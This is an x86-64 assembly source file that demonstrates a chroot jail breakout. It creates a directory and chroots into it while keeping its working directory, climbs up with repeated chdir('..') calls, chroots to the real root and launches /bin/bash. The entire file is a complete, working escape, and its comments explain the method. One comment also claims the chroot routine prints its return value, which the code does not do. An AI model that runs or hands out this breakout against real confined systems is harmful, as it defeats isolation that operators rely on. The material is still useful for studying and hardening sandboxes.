; jailbreak.asm - Copyright (C) 2018 Gabriele Tornetta. All rights reserved.
;
; Demonstration of how to break from a chroot jail.
;
; This works by chrooting into a new directory while maintaining the current
; working directory. We can then navigate to the actual root folder recursively
; and gain view of the full file system.
;
; This is demonstrated by navigating many levels up to make sure we hit the
; actual / folder, and then launch /bin/bash.
;

global _start


;; CONSTANTS
SYS_WRITE   equ   1
SYS_EXECVE  equ  59
SYS_EXIT    equ  60
SYS_CHDIR   equ  80
SYS_MKDIR   equ  83
SYS_CHROOT  equ 161

STDOUT      equ   1


;; Initialised data
SECTION .data
newdir db "thegreatescape", 0
up     db "..", 0
here   db ".", 0
bash   db "/bin/bash", 0

;; Uninitialised data
SECTION .bss
retval resb 8

;; Code
SECTION .text

_start:
  ; Make the new folder
  call    mkdir

  mov     rdi, newdir
  call    chroot

  ; Navigate up sufficiently many times
  mov     rcx, 100

  nav_up:
    push    rcx

    call    chdir

    pop     rcx
    dec     rcx
    test    rcx, rcx
    jnz     nav_up
  ; end nav_up

  mov     rdi, here
  call    chroot

  call    execve

  ; Exit
  xor     rdi, rdi
  mov     rax, SYS_EXIT
  syscall

;;;;;; end _start

;;
;; void mkdir()
;;
;;   Create the new directory.
;;
mkdir:
  mov     rax, SYS_MKDIR
  mov     rdi, newdir
  mov     rsi, 0755
  syscall

  ret
;;;;;; end mkdir


;;
;; void chdir()
;;
;;   Navigate up.
;;
chdir:
  ; syscall(SYS_CHDIR, up)
  mov     rax, SYS_CHDIR
  mov     rdi, up
  syscall

  ret
;;;;;; end chdir


;;
;; void chroot(char * path)
;;
;;   Calls SYS_CHROOT and prints the return value to stdout.
;;
chroot:
  ; syscall(SYS_CHROOT, etc)
  mov     rax, SYS_CHROOT
  syscall

  ret
;;;;;; end chroot


;;
;; void execve()
;;
;;   Execute bash.
;;
execve:
  xor     rdx, rdx
  xor     rsi, rsi
  mov     rdi, bash
  mov     rax, SYS_EXECVE
  syscall

  ret
;;;;;; end execvc

